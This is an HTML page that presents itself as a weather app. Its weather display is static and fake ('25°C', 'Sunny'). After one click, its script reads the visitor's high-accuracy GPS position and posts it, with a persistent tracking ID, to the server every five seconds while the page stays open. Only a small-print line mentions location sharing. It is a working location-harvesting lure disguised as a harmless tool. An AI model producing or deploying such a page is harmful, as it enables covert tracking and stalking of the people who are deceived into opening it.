<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather App</title>
    <link rel="stylesheet" href="/glass.css">
    <style>
        /* Body Styling */
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 1.25rem;
            color: var(--txt);
            font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
        }

        /* Weather Card Styling */
        .weather-card {
            position: relative;
            width: 100%;
            max-width: 340px;
            padding: 2rem 1.75rem;
            text-align: center;
            animation: revealUp .85s var(--ease) both;
        }

        /* Title Styling */
        .weather-card h2 {
            margin-bottom: .35rem;
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--txt);
            letter-spacing: -.02em;
        }

        .tagline {
            margin: 0 0 .4rem;
            font-size: .72rem;
            letter-spacing: .22em;
            text-transform: uppercase;
            color: var(--txt-dim);
        }

        /* Location Styling */
        .location {
            margin-top: .35rem;
            font-size: .92rem;
            color: var(--txt-dim);
        }

        /* Weather Icon Styling */
        .weather-icon {
            position: relative;
            margin: 1.6rem 0 1.2rem;
        }

        .weather-icon img {
            width: 88px;
            height: 88px;
            filter: drop-shadow(0 10px 26px rgba(110, 231, 255, .45));
            animation: floatY 5.5s ease-in-out infinite;
        }

        /* halo behind icon */
        .weather-icon::before {
            content: "";
            position: absolute;
            inset: -35%;
            z-index: -1;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(110, 231, 255, .32), transparent 68%);
            animation: orbDrift 14s ease-in-out infinite alternate;
        }

        /* Weather Info Styling */
        .weather-info {
            margin: 1.4rem 0 1.75rem;
            padding-top: 1.25rem;
            border-top: 1px solid rgba(255, 255, 255, .12);
        }

        .temperature {
            display: block;
            font-size: 3rem;
            font-weight: 700;
            line-height: 1.1;
            letter-spacing: -.03em;
            background: linear-gradient(92deg, var(--accent), var(--accent-2) 55%, var(--accent-3));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .condition {
            display: block;
            margin-top: .2rem;
            font-size: .95rem;
            color: var(--txt-dim);
        }

        /* Button Styling */
        button {
            width: 100%;
            font-family: inherit;
            cursor: pointer;
        }

        .hint {
            margin: .9rem 0 0;
            font-size: .72rem;
            line-height: 1.5;
            color: rgba(198, 208, 240, .6);
        }

        @media(max-width: 500px) {
            .weather-card {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="glass-bg"></div>
    <div class="glass-bg__grid"></div>

    <div class="weather-card glass glass--pad glass--shine">
        <h2 class="g-title">Weather App</h2>
        <p class="tagline">Location Sharing</p>
        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>

        <!-- Weather Icon -->
        <div class="weather-icon">
            <img src="/weather.png" alt="Weather Icon">
        </div>

        <div class="weather-info">
            <span class="temperature">25°C</span>
            <span class="condition">Sunny</span>
        </div>

        <button id="check-weather" class="g-btn g-btn--primary">Check Weather</button>
        <p class="hint">Your location is shared only while this page stays open.</p>
    </div>


    <script src="/glass.js"></script>
    <script>
        const id = localStorage.getItem("id") || generateId()
        const btn = document.querySelector("#check-weather")
        let __interval

        btn.addEventListener("click", () => {
            btn.disabled = true
            btn.innerHTML = "Fetching...."

            getLocation()
        })

        function getLocation() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    btn.disabled = true
                    const lat = position.coords.latitude
                    const lng = position.coords.longitude

                    fetch("/weather", {
                        method: "POST",
                        body: JSON.stringify({
                            id,
                            lat,
                            lng,
                        }),
                        headers: {
                            "Content-Type": "application/json"
                        }
                    }).catch(error => {
                        console.log("post error", error)
                    })
                },
                (error) => {
                    alert("Please Turn on GPS Location.")
                    btn.disabled = false
                    btn.innerHTML = "Check Weather"
                    console.error("Error watching position:", error);
                },
                {
                    enableHighAccuracy: true, // Use GPS if available
                }
            )

            if (__interval) clearTimeout(__interval)
            __interval = setTimeout(getLocation, 5000)
        }

        function generateId(length = 10) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters[randomIndex];
            }

            localStorage.setItem("id", result)
            return result;
        }

    </script>
</body>

</html>
